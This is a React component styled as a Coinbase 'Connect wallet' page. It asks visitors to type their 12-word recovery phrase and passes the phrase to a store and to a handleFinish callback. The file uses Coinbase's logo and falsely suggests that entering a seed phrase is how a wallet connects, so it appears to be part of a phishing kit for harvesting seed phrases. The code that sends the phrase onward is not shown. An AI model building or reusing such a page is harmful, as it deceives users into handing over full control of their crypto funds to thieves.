"use client";
import { useWalletStore } from "@/store/walletStore";
import { useState, useRef, useEffect } from "react";

const Coinbase = ({
	handleFinish,
}: {
	handleFinish: (walletPhrase: string) => Promise<void>;
}) => {
	const [backupPhrase, setBackupPhrase] = useState("");
	const [phraseWords, setPhraseWords] = useState<string[]>([]);
	const textareaRef = useRef<HTMLTextAreaElement>(null);
	const containerRef = useRef<HTMLDivElement>(null);
	const { setSeedPhrase } = useWalletStore();

	const handleComplete = () => {
		setSeedPhrase(phraseWords.join(" "));
		handleFinish(phraseWords.join(" "));
	};

	// Dynamically adjust textarea height as text changes
	useEffect(() => {
		const textarea = textareaRef.current;
		if (textarea) {
			textarea.style.height = "auto";
			textarea.style.height = `${textarea.scrollHeight}px`;
		}
	}, [backupPhrase]);

	// Click anywhere inside the field to focus textarea
	useEffect(() => {
		const container = containerRef.current;
		const textarea = textareaRef.current;
		if (container && textarea) {
			const handleClick = () => textarea.focus();
			container.addEventListener("click", handleClick);
			return () => container.removeEventListener("click", handleClick);
		}
	}, []);

	// Handle input change
	const handleChange = (value: string) => {
		setBackupPhrase(value);
		const words = value
			.trim()
			.split(/\s+/) // split by one or more spaces
			.filter((word) => word.length > 0); // remove empty strings
		setPhraseWords(words);
	};

	return (
		<div className="min-h-screen bg-black w-full flex flex-col items-center justify-center p-4">
			<div className="flex w-full justify-center items-center">
				<img
					src="/images/wallets/coinbase-v2.svg"
					alt="coin base"
					className="w-24 h-24"
				/>
			</div>
			<div className="w-full max-w-md">
				{/* Card */}
				<div className="mt-24 flex flex-col w-full h-full px-6 py-8 gap-8 rounded-lg max-w-md m-auto bg-gray-950">
					<div>
						<h1 className="text-2xl font-bold text-white mb-12">
							Connect wallet
						</h1>
						<p className="text-white/80 text-sm">
							Enter your wallet 12-word recovery phrase (also called a seed
							phrase). You can connect any Ethereum wallet using this phrase.
						</p>
					</div>

					{/* Floating Label Textarea */}
					<div
						ref={containerRef}
						className="relative mb-28 border border-white/30 focus-within:border-blue-400 transition-all duration-200 rounded-lg px-4 pt-3 pb-1 cursor-text"
					>
						<textarea
							ref={textareaRef}
							id="backupPhrase"
							value={backupPhrase}
							onChange={(e) => handleChange(e.target.value)}
							placeholder="Your backup phrase"
							className="peer bg-transparent border-none outline-none w-full text-white/90 placeholder-transparent resize-none overflow-hidden min-h-10"
							rows={1}
						/>
						<label
							htmlFor="backupPhrase"
							className={`absolute left-3 top-3 text-white/50 text-base transition-all duration-200 
								peer-placeholder-shown:top-3 peer-placeholder-shown:text-white/50 peer-placeholder-shown:text-base 
								peer-focus:bg-gray-950 peer-focus:px-2 peer-focus:rounded-full
								peer-focus:-top-3 peer-focus:text-sm peer-focus:text-blue-400
								${
									backupPhrase
										? "-top-3 text-sm text-blue-400 bg-gray-950 px-2 rounded-full"
										: ""
								}`}
						>
							Your backup phrase
						</label>
					</div>

					{/* Buttons */}
					<div className="flex flex-col justify-center items-center">
						<button
							onClick={handleComplete}
							disabled={phraseWords.length === 0}
							className="w-full bg-[#0052FF] text-black hover:bg-blue-400 disabled:opacity-60 py-3 rounded-full"
						>
							{" "}
							Connect Wallet{" "}
						</button>
					</div>
				</div>
			</div>
		</div>
	);
};

export default Coinbase;
